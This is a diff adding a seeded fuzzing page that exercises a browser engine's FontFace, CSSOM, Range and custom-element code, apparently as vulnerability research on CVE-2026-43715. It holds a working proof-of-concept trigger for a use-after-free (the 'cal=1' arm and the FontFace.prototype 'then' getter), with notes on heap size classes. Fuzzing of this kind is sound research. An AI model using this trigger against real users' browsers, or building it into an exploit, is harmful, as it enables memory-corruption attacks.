@@ -1,0 +1,535 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>fuzz-cssom seq — sequence-shaped rounds over the docs/84 alphabet, plus the docs/65 arming op</title>
+<link rel="stylesheet" href="fuzz.css">
+<style id="s0">
+.c0 { color: #111 }
+</style>
+<style id="wchurn">q{color:#222}</style>
+<body>
+<div id="root"><p id="p0">delta</p><span id="sp">gamma</span></div>
+<script>
+// docs/85.  docs/84's sweep drew one operation per iteration; the bug this programme actually owns
+// (docs/65, CVE-2026-43715) needs a *three-step ordering*: a document @font-face with a client in
+// the set, a sheet rebuild that frees it, and a script window inside the getter that runs the
+// recalc.  i.i.d. sampling reaches orderings like that rarely — and, worse, docs/84's alphabet had
+// no op that could open the window at all: `Fnew-local` uses local("NoSuchFontName"), whose source
+// fails synchronously, so pump() goes Pending -> Loading -> Failure and FontFace::fontStateChanged
+// *rejects* (no resolve, no `then` read).  Only a source that resolves synchronously reaches
+// Status::Success, where `m_loadedPromise->resolve(*this)` runs page script inside
+// iterateClients inside setStatus — the window the CVE lives in.
+//
+// What this instrument changes, and nothing else:
+//   1. a *round* is 3-6 operations run back to back in one task, so state that a setTimeout(0)
+//      would normally settle (a pending load, a queued microtask, a stale resolver) is still in
+//      flight when the next op runs;
+//   2. two ops are added: `Fnew-good` (a JS FontFace with a source that resolves synchronously, so
+//      the window really fires inside setStatus) and `Fdoc` (the docs/65 arming sequence itself);
+//   3. `gc=1` puts a collection inside the window: ~400k objects allocated in the engine's frame,
+//      with WeakRef decoys created in the PREVIOUS task as the witness (docs/77/docs/78);
+//   4. `cal=1` replays the docs/65 sequence verbatim, once, as the instrument's sensitivity check.
+//
+// Determinism: one xorshift32 word chooses how many of six slots run (3..6), then exactly four
+// words per slot, always, whatever the op.  A round therefore draws 1 + 6*4 = 25 words, and the op
+// id and arguments at slot s of round r are a pure function of (seed, r) — `only=`/`skip=` and the
+// slot count never renumber the stream.  Beacons: `m=<round>&op=<last>` every `every=` rounds, a
+// final `m=done`, and one `m=census` line per op id.
+(function () {
+  'use strict';
+  var Q = new URLSearchParams(location.search);
+  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }
+  function B(m, x) {
+    try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : ''); } catch (e) {}
+  }
+
+  var SEED  = (parseInt(K('seed', '1'), 10) >>> 0) || 1;
+  var N     = Math.max(0, parseInt(K('n', '2000'), 10));       // ROUNDS, not operations
+  var EVERY = Math.max(1, parseInt(K('every', '200'), 10));
+  var BATCH = Math.max(1, parseInt(K('batch', '10'), 10));     // rounds per task
+  var ONLY  = K('only', '') ? K('only', '').split(',') : null;
+  var SKIP  = K('skip', '') ? K('skip', '').split(',') : null;
+  var THEN  = K('then', '0') === '1';
+  var DELF  = K('del', '0') === '1';                           // then=1 only
+  var GC    = K('gc', '0') === '1';
+  var GCMAX = Math.max(0, parseInt(K('gcmax', '60'), 10));     // windows that do the churn
+  var CAL   = K('cal', '0') === '1';
+  var DBG   = K('dbg', '0') === '1';                           // diagnostic beacons inside ops
+  var MAXF  = Math.max(1, parseInt(K('maxfaces', '8'), 10));
+  var MAXR  = Math.max(1, parseInt(K('maxrules', '24'), 10));
+  var MAXE  = Math.max(0, parseInt(K('maxels', '40'), 10));
+  var TICK  = Math.max(0, parseInt(K('tick', '5000'), 10));
+
+  // xorshift32, identical to docs/84's page.  Seed 0 is remapped (the generator's fixed point).
+  var st = SEED;
+  function rnd() { st ^= st << 13; st >>>= 0; st ^= st >>> 17; st ^= st << 5; st >>>= 0; return st; }
+
+  var root = document.getElementById('root');
+  var p0 = document.getElementById('p0');
+  var s0 = document.getElementById('s0');
+  var live = [], probe = [], els = [], defs = [], junk = [], docEls = {}, lastDoc = null;
+  var counter = 0, STAT = '', depth = 0, thenHits = 0, seq = 0, lastOp = 'none', gcHits = 0, gcAlive = '';
+  var T0 = Date.now();
+  var CNT = {}, ERRC = {}, ERRLAST = {};
+
+  function noop() {}
+  function inlineSheet() { return s0 && s0.sheet ? s0.sheet : null; }
+  function linkSheet() {
+    var L = document.styleSheets;
+    for (var i = 0; i < L.length; i++) {
+      var s = L[i];
+      try { if (s.href && s.href.indexOf('fuzz.css') >= 0) return s; } catch (e) {}
+    }
+    return null;
+  }
+  function fam(a) { return 'zzF' + (a % 16); }
+  function pick(l, a) { return l.length ? l[a % l.length] : null; }
+  function trimFaces() {
+    while (live.length > MAXF) { var f = live.shift(); try { document.fonts.delete(f); } catch (e) {} }
+  }
+  function trimRules(s) {
+    try { while (s && s.cssRules && s.cssRules.length > MAXR) s.deleteRule(s.cssRules.length - 1); } catch (e) {}
+  }
+  function trimEls() {
+    while (els.length > MAXE) { var el = els.shift(); if (el && el.parentNode) el.parentNode.removeChild(el); }
+  }
+
+  // ---------------------------------------------------------------- the alphabet (docs/84, verbatim)
+  var OPS = [
+    // --- font lifecycle (docs/65)
+    ['Fnew-local', 6, function (a, b) {
+      var f = new FontFace(fam(a), 'local("NoSuchFontName' + (b % 7) + '")');
+      document.fonts.add(f);
+      f.load().then(noop, noop);
+      live.push(f); trimFaces();
+    }],
+    ['Fnew-url', 3, function (a, b) {
+      var f = new FontFace(fam(a), 'url(/nope' + (b % 5) + '.woff2)');
+      document.fonts.add(f);
+      f.load().then(noop, noop);
+      live.push(f); trimFaces();
+    }],
+    ['Fcheck', 3, function (a) {
+      var f = pick(live, a);
+      STAT = document.fonts.check('1em "' + (f ? f.family : fam(a)) + '"');
+    }],
+    ['Fload', 3, function (a) {
+      var f = pick(live, a);
+      document.fonts.load('1em "' + (f ? f.family : fam(a)) + '"', 'A').then(noop, noop);
+    }],
+    ['Fstatus', 3, function (a) {
+      var f = pick(live, a);
+      if (f) STAT = f.status;
+    }],
+    ['Fdel', 2, function (a) {
+      if (!live.length) return;
+      document.fonts.delete(live.splice(a % live.length, 1)[0]);
+    }],
+    ['Fstyle', 5, function (a) {
+      var n = 'zzS' + (a % 8);
+      var el = document.createElement('style');
+      el.textContent = '@font-face{font-family:' + n + ';src:local("NoSuchFontName")}.' + n + '{font-family:' + n + '}';
+      document.head.appendChild(el);
+      probe.push(el);
+      root.className = n;
+      // remove the owning <style> of an older face — docs/65 Attempt 8/9's "two rebuilds" surface
+      while (probe.length > 4) { var o = probe.shift(); if (o.parentNode) o.parentNode.removeChild(o); }
+    }],
+    ['Fready', 1, function () { document.fonts.ready.then(noop, noop); }],
+
+    // --- CSSOM rule mutation (docs/72)
+    ['Rfont', 6, function (a) {
+      var s = inlineSheet(); if (!s) return;
+      s.insertRule('@font-face{font-family:zzR' + (a % 16) + ';src:local("NoSuchFontName")}', 0);
+      trimRules(s);
+    }],
+    ['Rplain', 4, function (a, b) {
+      var s = inlineSheet(); if (!s) return;
+      var L = s.cssRules.length;
+      s.insertRule('.c' + (a % 12) + '{color:rgb(' + (b % 256) + ',0,0)}', b % (L + 1));
+      trimRules(s);
+    }],
+    ['Rdel', 4, function (a, b, c) {
+      var s = inlineSheet(); if (!s) return;
+      var L = s.cssRules.length; if (!L) return;
+      s.deleteRule(c % L);
+    }],
+    ['Rmedia', 3, function (a, b) {
+      var s = inlineSheet(); if (!s) return;
+      s.insertRule('@media all{.m' + (a % 8) + '{color:blue}}', 0);
+      var r = s.cssRules[0];
+      if (r && r.insertRule && r.cssRules && r.cssRules.length === 0) r.insertRule('.mi' + (b % 4) + '{margin:0}', 0);
+      trimRules(s);
+    }],
+    // docs/67's deterministic crash: a @page rule inserted into a grouping rule whose parentStyleSheet was
+    // cleared by deleteRule(0). Kept in the alphabet as the instrument's own sensitivity control.
+    ['Rpage', 1, function (a) {
+      var el = document.createElement('style');
+      el.textContent = '@media all{}';
+      document.head.appendChild(el);
+      var s = el.sheet; if (!s) return;
+      var g = s.cssRules[0];
+      if (!g || !g.insertRule) { el.parentNode.removeChild(el); return; }
+      s.deleteRule(0);
+      g.insertRule('@page foo' + (a % 4) + ' {}', 0);
+      el.parentNode.removeChild(el);
+    }],
+    ['Rnest-inline', 2, function (a, b) {
+      var s = inlineSheet(); if (!s) return;
+      var L = s.cssRules.length; if (!L) return;
+      var r = s.cssRules[b % L];
+      if (r && r.insertRule) r.insertRule('& b{color:green}', 0);
+    }],
+    // docs/72's deterministic crash: nesting insertRule into a *copied* (<link>) sheet's CSSStyleRule.
+    ['Rnest-link', 1, function (a, b) {
+      var s = linkSheet(); if (!s) return;
+      var L = s.cssRules.length; if (!L) return;
+      var r = s.cssRules[b % L];
+      if (r && r.insertRule) r.insertRule('& b{color:red}', 0);
+    }],
+    ['Rlinkplain', 2, function (a, b) {
+      var s = linkSheet(); if (!s) return;
+      var L = s.cssRules.length;
+      s.insertRule('.lz' + (a % 10) + '{margin-top:' + (b % 9) + 'px}', b % (L + 1));
+      trimRules(s);
+    }],
+    ['Rlinkdel', 2, function (a, b, c) {
+      var s = linkSheet(); if (!s) return;
+      var L = s.cssRules.length; if (!L) return;
+      s.deleteRule(c % L);
+    }],
+    ['Rdetach', 2, function (a) {
+      if (!s0) return;
+      var p = s0.parentNode;
+      if (p) p.removeChild(s0);
+      var s = s0.sheet;
+      if (s) { try { s.insertRule('.d' + (a % 5) + '{color:#000}', 0); } catch (e) {} trimRules(s); }
+      if (p) p.appendChild(s0);
+    }],
+
+    // --- custom-element reactions (docs/80)
+    ['Cdef', 2, function () {
+      if (defs.length > 200) return;
+      var n = 'x-fz' + (counter++);
+      customElements.define(n, class extends HTMLElement {
+        constructor() { super(); this.t = 1; }
+        connectedCallback() { this.setAttribute('c', '1'); }
+        attributeChangedCallback(k, o, v) { this.t = 2; }
+        static get observedAttributes() { return ['a', 'c']; }
+      });
+      defs.push(n);
+    }],
+    ['Cup', 3, function (a) {
+      if (!defs.length) return;
+      var el = document.createElement(defs[a % defs.length]);
+      root.appendChild(el);
+      els.push(el); trimEls();
+    }],
+    ['Cupgrade', 2, function (a) {
+      customElements.upgrade(root);
+      if (defs.length) customElements.whenDefined(defs[a % defs.length]).then(noop, noop);
+    }],
+    ['Cattr', 2, function (a, b) {
+      var el = pick(els, a);
+      if (el) el.setAttribute('a', String(b % 9));
+    }],
+
+    // --- Range / Selection boundary churn (docs/68)
+    ['Grange', 3, function (a) {
+      var r = document.createRange();
+      r.selectNodeContents(p0);
+      r.deleteContents();
+      p0.textContent = 'd' + (a % 9);
+    }],
+    ['Gsel', 2, function () {
+      var s = getSelection(); if (!s) return;
+      var r = document.createRange();
+      r.selectNodeContents(p0);
+      s.addRange(r);
+      s.removeAllRanges();
+    }],
+    ['Gchurn', 2, function () {
+      var r = document.createRange();
+      for (var i = 0; i < 32; i++) {
+        var t = document.createTextNode('t' + i);
+        root.appendChild(t);
+        r.setStart(t, 0); r.setEnd(t, 1);
+        root.removeChild(t);
+        r.setStart(p0, 0); r.setEnd(p0, p0.childNodes.length);
+      }
+    }],
+    ['Gsurround', 1, function () {
+      var r = document.createRange();
+      r.selectNodeContents(p0);
+      try { r.surroundContents(document.createElement('b')); } catch (e) {}
+      r.compareBoundaryPoints(Range.START_TO_END, r);
+    }],
+
+    // --- the recalc trigger and a GC churn
+    ['Llayout', 6, function () { STAT = document.body.offsetHeight; root.getBoundingClientRect(); }],
+    ['Ltext', 2, function (a) {
+      var t = p0.firstChild;
+      if (t && t.nodeType === 3) t.data = 'd' + (a % 9);
+      STAT = document.body.offsetHeight;
+    }],
+    ['Mchurn', 2, function () {
+      for (var i = 0; i < 512; i++) junk.push({ x: i, s: 's' + i });
+      if (junk.length > 8192) junk.length = 0;
+    }]
+  ];
+
+  // ------------------------------------------------- the two ops this instrument adds (docs/85)
+  // Fnew-good: a JS FontFace whose source resolves synchronously.  `local("NoSuchFontName")` (the
+  // docs/84 op) can never open the window: the source fails before Success, so fontStateChanged
+  // goes to Failure and rejects.  A resolvable local source reaches Status::Success, where
+  // `m_loadedPromise->resolve(*this)` reads `then` on the FontFace — page script inside
+  // iterateClients inside setStatus.
+  OPS.push(['Fnew-good', 6, function (a) {
+    var f = new FontFace(fam(a), 'local("DejaVu Sans")');
+    document.fonts.add(f);
+    try { f.loaded; } catch (e) {}        // materialise the promise: see Fdoc (docs/85 §3)
+    f.load().then(noop, noop);
+    live.push(f); trimFaces();
+  }]);
+  // Fdoc: the docs/65 arming sequence, sampled.  A document @font-face with a resolvable local
+  // source, laid out so the selector builds the face, its JS FontFace taken from document.fonts,
+  // then load() — Success — resolve(*this) — the window — and the window's own layout frees it.
+  // The window's action (the getter below) is what turns this into the CVE; on its own it is just
+  // a document face being loaded.  Families are reused mod 8, so the sheet for a family is removed
+  // before the new one is added and the face this op wants is the one still Status::unloaded —
+  // without that, `forEach` hands back an older, already-loaded face and `load()` does nothing.
+  OPS.push(['Fdoc', 6, function (a) {
+    var n = 'zzD' + (a % 8);
+    var old = docEls[n];
+    if (old && old.parentNode) old.parentNode.removeChild(old);
+    var el = document.createElement('style');
+    // no element uses the family on purpose: a used face starts loading during the layout, and
+    // load() on it is then a no-op with no window.  The docs/65 recipe needs the face Pending when
+    // load() is called, so that pump() runs setStatus(Loading) -> (script) -> setStatus(Success).
+    el.textContent = '@font-face{font-family:' + n + ';src:local("DejaVu Sans")}';
+    document.head.appendChild(el);
+    docEls[n] = el;
+    probe.push(el);
+    document.body.offsetHeight;
+    var f = null;
+    document.fonts.forEach(function (x) {
+      if (String(x.family).indexOf(n) < 0) return;
+      var st = '';
+      try { st = x.status; } catch (e) {}
+      if (st !== 'loaded') f = x;               // the fresh face, not a leftover from an older sheet
+    });
+    if (DBG) B('fdoc', 'n=' + n + '&found=' + (f ? 1 : 0) + '&probe=' + probe.length + '&fc=' + (function () { try { return document.fonts.size; } catch (e) { return -1; } })());
+    if (f) {
+      lastDoc = f;
+      // Materialise `loaded` BEFORE load(), exactly as the docs/65 page does (`String(face.loaded)`).
+      // Without this the window does not open inside setStatus at all: DOMPromiseProxy::resolve() only
+      // stores the value when the page has never asked for the promise, and the fulfilment — the
+      // `then` read, i.e. the script window — then happens later, at `m_loadedPromise.get()` inside
+      // loadForBindings, i.e. AFTER `m_status = newStatus`.  Measured: the window's own `this.status`
+      // reads "loaded" without this statement and "loading" with it (docs/85 §3).
+      try { f.loaded; } catch (e) {}
+      try { f.load().then(noop, noop); } catch (e) {}
+      if (DBG) B('fdocpost', 'st=' + (function () { try { return f.status; } catch (e) { return 'threw'; } })());
+    }
+  }]);
+
+  var TOT = 0, CUM = [];
+  for (var oi = 0; oi < OPS.length; oi++) { TOT += OPS[oi][1]; CUM.push(TOT); }
+  function pickOp(r) {
+    var x = r % TOT;
+    for (var i = 0; i < CUM.length; i++) if (x < CUM[i]) return OPS[i];
+    return OPS[OPS.length - 1];
+  }
+
+  // ---------------------------------------------------------------- gc witness (docs/77/docs/78)
+  // Decoys are made in a PREVIOUS task (a batch boundary) so no dead JS frame can keep them alive;
+  // ~400k objects are allocated inside the window so a collection has to happen there.  The churn's
+  // allocations are 1 KB array butterflies, deliberately NOT the 192-byte class of the freed
+  // CSSFontFace, so this arm cannot steal the slot it is measuring (STEP 5: a control allocates in
+  // a different class or not at all).
+  // churnSheet(): remove one unrelated, @font-face-free <style> and add a fresh one, so every
+  // window performs a real StyleSheetCollection change.  That is the docs/65 recipe's `#v` removal:
+  // the rebuild that follows re-adopts every surviving face onto a new CSSFontFace
+  // (CSSFontSelector.cpp:234), which drops the last Ref of the face that is mid-setStatus and frees
+  // it.  Removing the *loading* face's own sheet would not do it — with no rule left, adopt() is
+  // never called and the wrapper's Ref keeps the face alive.
+  function churnSheet() {
+    var w = document.getElementById('wchurn');
+    var had = !!w;
+    if (w && w.parentNode) w.parentNode.removeChild(w);
+    var nw = document.createElement('style');
+    nw.id = 'wchurn'; nw.textContent = 'q{color:#222}';
+    document.head.appendChild(nw);
+    return had;
+  }
+
+  var decs = [];
+  function makeDecoys() {
+    decs = [];
+    for (var i = 0; i < 8; i++) decs.push(new WeakRef({ i: i, s: 'dec' + i, a: new Array(256).fill(i) }));
+  }
+  function decAlive() {
+    var alive = 0;
+    for (var i = 0; i < decs.length; i++) { try { if (decs[i].deref()) alive++; } catch (e) {} }
+    return alive;
+  }
+  function gcWindow() {
+    if (gcHits >= GCMAX) return;
+    var j = [];
+    for (var i = 0; i < 400000; i++) j.push(new Array(128).fill(i));
+    j.length = 0;
+    var before = gcAlive;
+    gcAlive = decAlive() + '/' + decs.length;
+    gcHits++;
+    if (gcHits <= 6) B('gcprobe', 'pre=' + before + '&post=' + gcAlive + '&h=' + gcHits);
+  }
+
+  // ---------------------------------------------------------------- the script window
+  // then=1 installs the accessor on FontFace.prototype — the object the engine reads when it
+  // resolves a FontFace promise, i.e. exactly inside FontFace::fontStateChanged inside
+  // iterateClients inside setStatus.  Narrow on purpose: an Object.prototype `then` (docs/84's
+  // instrument) also fires for FontFaceSet/Array resolutions, which are windows in *other* frames.
+  if (THEN) {
+    try {
+      Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get: function () {
+          if (depth > 0) return undefined;           // reentrancy guard, depth 1
+          thenHits++;
+          if (thenHits <= 8) B('then', 'k=' + (this && this.constructor ? this.constructor.name : '?') +
+            '&fam=' + (this && this.family ? String(this.family) : '?'));
+          depth++;
+          try {
+            if (GC) gcWindow();
+            var stIn = '?';
+            if (DBG) { try { stIn = this.status; } catch (e) { stIn = 'threw'; } }
+            var had = churnSheet();                    // the free's trigger: an unrelated sheet change
+            var m = thenHits % 3;
+            if (m === 2) {
+              var sh = inlineSheet();
+              if (sh && sh.cssRules.length) sh.deleteRule(0);
+            }
+            document.body.offsetHeight;                // layout: CSSFontSelector::buildCompleted
+            var stOut = '?';
+            if (DBG) { try { stOut = this.status; } catch (e) { stOut = 'threw'; } }
+            if (DBG && thenHits <= 40) B('win', 'h=' + thenHits + '&m=' + m + '&had=' + (had ? 1 : 0) + '&same=' + (this === lastDoc ? 1 : 0) + '&in=' + stIn + '&out=' + stOut);
+            if (DELF) {
+              var lf = pick(live, thenHits);
+              if (lf) { live.splice(live.indexOf(lf), 1); document.fonts.delete(lf); }
+            }
+          } catch (e) {}
+          depth--;
+          return undefined;                          // resolve immediately: no thenable, no second call
+        },
+        set: function (v) {}
+      });
+    } catch (e) { B('thenfail', 'e=' + (e && e.name)); }
+  }
+
+  B('boot', 'seed=' + SEED + '&n=' + N + '&then=' + (THEN ? 1 : 0) + '&gc=' + (GC ? 1 : 0) +
+    '&gcmax=' + GCMAX + '&cal=' + (CAL ? 1 : 0) +
+    '&only=' + (ONLY ? ONLY.join('.') : 'all') + '&skip=' + (SKIP ? SKIP.join('.') : 'none') +
+    '&batch=' + BATCH + '&every=' + EVERY + '&del=' + (DELF ? 1 : 0));
+
+  // ---------------------------------------------------------------- cal=1: docs/65, verbatim
+  // The same five statements as research/cve-2026-43715/reclaim.html (and upstream's
+  // LayoutTests/fonts/font-face-load-crash.html): <style id=v>x{}</style> (unrelated), a
+  // <style id=f> holding one @font-face with a source that resolves, layout so the selector builds
+  // the face, the face taken from document.fonts, then face.load().  The getter removes #v and
+  // forces layout inside the resolve — buildCompleted() adopts the wrapper onto the rebuilt face,
+  // the old one loses its last Ref and is freed, and setStatus writes m_status into it at :595.
+  // This arm is the instrument's sensitivity check: it must produce the sanitizer report, or the
+  // instrument cannot see the bug it is aimed at and its null means nothing.
+  function calRun() {
+    var calHit = 0;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function () {
+        calHit++;
+        if (calHit > 1) return undefined;
+        B('cal-getter', 'hit=' + calHit + '&fam=' + (this && this.family ? String(this.family) : '?'));
+        try {
+          var sv = document.getElementById('v');
+          if (sv && sv.parentNode) sv.parentNode.removeChild(sv);
+          document.body.offsetHeight;                 // the free: CSSFontSelector::buildCompleted
+        } catch (e) { B('cal-threw', 'e=' + (e && e.name)); }
+        return undefined;
+      },
+      set: function (v) {}
+    });
+    var sv0 = document.createElement('style'); sv0.id = 'v'; sv0.textContent = 'x{}';
+    document.head.appendChild(sv0);
+    var sf0 = document.createElement('style'); sf0.id = 'f';
+    sf0.textContent = '@font-face { font-family: t; src: local("DejaVu Sans"); }';
+    document.head.appendChild(sf0);
+    document.body.offsetHeight;
+    var cf = null, cn = 0;
+    document.fonts.forEach(function (f) { cn++; if (!cf && f.family === 't') cf = f; });
+    B('cal-face', 'n=' + cn + '&picked=' + (cf ? cf.family : 'none') + '&loaded=' + (cf ? String(cf.loaded) : '-'));
+    document.body.offsetHeight;
+    if (cf) {
+      try { cf.load(); B('cal-returned', 'st=' + cf.status + '&hits=' + calHit); }
+      catch (e) { B('cal-load-threw', 'e=' + (e && e.name)); }
+    } else {
+      B('cal-noface');
+    }
+  }
+  if (CAL) {
+    // later=1 defers the same five statements to a task, i.e. the context the fuzzer's rounds run in
+    // (a loaded document, not a document still being parsed).  One variable: the timing.
+    if (K('later', '0') === '1') setTimeout(calRun, 0); else calRun();
+    return;
+  }
+
+  // ---------------------------------------------------------------- rounds of 3..6 operations
+  var SLOTS = 6;
+  function census() {
+    for (var i = 0; i < OPS.length; i++) {
+      var id = OPS[i][0];
+      B('census', 'op=' + id + '&n=' + (CNT[id] || 0) + '&e=' + (ERRC[id] || 0) +
+        (ERRLAST[id] ? '&x=' + encodeURIComponent(ERRLAST[id]) : ''));
+    }
+  }
+  function finish() {
+    var fc = -1, cr = -1, lk = -1;
+    try { fc = document.fonts.size; } catch (e) {}
+    try { var is = inlineSheet(); cr = is ? is.cssRules.length : -1; } catch (e) {}
+    try { var ls = linkSheet(); lk = ls ? ls.cssRules.length : -1; } catch (e) {}
+    B('done', 'op=' + lastOp + '&rounds=' + N + '&then=' + thenHits + '&gc=' + gcHits +
+      '&gcalive=' + gcAlive + '&ms=' + (Date.now() - T0) +
+      '&fc=' + fc + '&cr=' + cr + '&lk=' + lk + '&sc=' + document.head.querySelectorAll('style').length +
+      '&eh=' + document.body.offsetHeight);
+    census();
+  }
+  function doRound() {
+    var wl = rnd();                                   // word 1: how many of the six slots run
+    var nlive = 3 + (wl % 4);                         // 3..6
+    if (GC && seq % 7 === 0) { makeDecoys(); gcAlive = decAlive() + '/' + decs.length; }
+    for (var s = 0; s < SLOTS; s++) {
+      var d0 = rnd(), d1 = rnd(), d2 = rnd(), d3 = rnd();   // exactly four per slot, always
+      if (s >= nlive) continue;
+      var op = pickOp(d0), id = op[0];
+      var run = true;
+      if (ONLY && ONLY.indexOf(id) < 0) run = false;
+      if (SKIP && SKIP.indexOf(id) >= 0) run = false;
+      if (run) {
+        lastOp = id;
+        CNT[id] = (CNT[id] || 0) + 1;
+        try { op[2](d1, d2, d3); }
+        catch (e) { ERRC[id] = (ERRC[id] || 0) + 1; ERRLAST[id] = (e && e.name) + ''; }
+      }
+    }
+    seq++;
+    if (seq % EVERY === 0) B(seq, 'op=' + lastOp);
+  }
+  function runBatch() {
+    var end = Math.min(N, seq + BATCH);
+    for (; seq < end; ) doRound();
+    if (seq < N) setTimeout(runBatch, 0);
+    else finish();
+  }
+
+  if (TICK) setInterval(function () { B('tick', 'round=' + seq + '&op=' + lastOp); }, TICK);
+  setTimeout(runBatch, 0);
+})();
+</script>
+</body>
